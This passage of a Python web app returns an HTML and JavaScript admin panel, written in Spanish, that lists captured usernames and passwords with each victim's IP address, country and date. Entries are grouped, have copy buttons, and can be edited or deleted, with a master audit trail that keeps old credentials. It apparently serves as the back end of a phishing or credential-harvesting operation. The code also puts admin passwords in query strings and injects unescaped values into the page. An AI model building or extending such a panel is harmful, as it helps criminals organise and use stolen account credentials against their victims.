                        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Sin datos guardados.</td></tr>';
                        return;
                    }

                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td><strong>${log.grupo}</strong></td>
                            <td><span class="copyable" onclick="copiarTexto('${log.usuario}')">${log.usuario} 📋</span></td>
                            <td><span class="copyable" onclick="copiarTexto('${log.contra}')">${log.contra} 📋</span></td>
                            <td>${log.ip}</td>
                            <td>${log.pais}</td>
                            <td>${log.fecha}</td>
                            <td>
                                <button class="btn-warning" onclick="abrirModal('${log.id}', '${log.usuario}', '${log.contra}', '${log.grupo}')">Editar</button>
                                <button class="btn-danger" onclick="eliminarLog('${log.id}')">Borrar</button>
                            </td>
                        `;
                        tbody.appendChild(tr);
                    });
                } catch (e) {
                    console.error("Error al cargar registros", e);
                }
            }

            async function toggleAuditoria() {
                const sec = document.getElementById('seccionAuditoria');
                if (sec.style.display === 'block') {
                    sec.style.display = 'none';
                    return;
                }
                sec.style.display = 'block';
                cargarAuditoriaMaestro();
            }

            async function cargarAuditoriaMaestro() {
                try {
                    const res = await fetch(`/api/maestro/auditoria?usuario=${encodeURIComponent(currentUser)}&password=${encodeURIComponent(currentPass)}`);
                    const data = await res.json();
                    const tbody = document.getElementById('tablaAuditoria');
                    tbody.innerHTML = '';

                    if (!data.auditoria || data.auditoria.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No hay registros de cambios o eliminaciones.</td></tr>';
                        return;
                    }

                    data.auditoria.forEach(item => {
                        const tr = document.createElement('tr');
                        const isDel = item.tipo_accion.includes("ELIMINACION");
                        const badge = isDel ? `<span class="badge-del">${item.tipo_accion}</span>` : `<span class="badge-edit">${item.tipo_accion}</span>`;
                        const prevUser = item.datos_previos ? (item.datos_previos.usuario || "") : "";
                        const prevPass = item.datos_previos ? (item.datos_previos.contrasena || "") : "";
                        const nuevos = item.datos_nuevos ? JSON.stringify(item.datos_nuevos) : "-";

                        tr.innerHTML = `
                            <td>${badge}</td>
                            <td><strong>${item.autor}</strong></td>
                            <td>${item.grupo_origen}</td>
                            <td><span class="copyable" onclick="copiarTexto('${prevUser}')">${prevUser} 📋</span></td>
                            <td><span class="copyable" onclick="copiarTexto('${prevPass}')">${prevPass} 📋</span></td>
                            <td style="font-size:12px; color:#555;">${nuevos}</td>
                            <td>${item.fecha}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                } catch (e) {
                    console.error("Error cargando auditoría", e);
                }
            }

            async function eliminarLog(id) {
                if (!confirm("¿Eliminar este registro?")) return;
                let formData = new URLSearchParams();
                formData.append('usuario', currentUser);
                formData.append('password', currentPass);

                const res = await fetch(`/api/logs/${id}`, { method: 'DELETE', body: formData });
                if (res.ok) {
                    cargarLogs();
                    if (isMaster) cargarAuditoriaMaestro();
                } else {
                    alert("Acceso denegado o error al eliminar.");
                }
            }

            async function eliminarGrupoActual() {
                const grupo = document.getElementById('grupoSelect').value;
                if (!confirm(`¿Eliminar los registros del grupo '${grupo}'?`)) return;
                let formData = new URLSearchParams();
                formData.append('usuario', currentUser);
                formData.append('password', currentPass);

                const res = await fetch(`/api/grupo/${grupo}`, { method: 'DELETE', body: formData });
                if (res.ok) {
                    cargarGruposYLogs();
                    if (isMaster) cargarAuditoriaMaestro();
                } else {
                    alert("Acceso denegado o error al eliminar grupo.");
                }
            }

            function abrirModal(id, usuario, contra, grupo) {
                document.getElementById('editId').value = id;
                document.getElementById('editUsuario').value = usuario;
                document.getElementById('editContra').value = contra;
                document.getElementById('editGrupo').value = grupo;
                document.getElementById('editModal').style.display = 'flex';
            }

            function cerrarModal() {
                document.getElementById('editModal').style.display = 'none';
            }

            async function guardarEdicion() {
                const id = document.getElementById('editId').value;
                const usuario = document.getElementById('editUsuario').value;
                const contra = document.getElementById('editContra').value;
                const grupo = document.getElementById('editGrupo').value;

                const res = await fetch(`/api/logs/${id}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ usuario, contra, grupo, admin_user: currentUser, admin_pass: currentPass })
                });
                if (res.ok) {
                    cerrarModal();
                    cargarGruposYLogs();
                    if (isMaster) cargarAuditoriaMaestro();
                } else {
                    let err = await res.json();
                    alert(err.detail || "Error al actualizar");
                }
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)
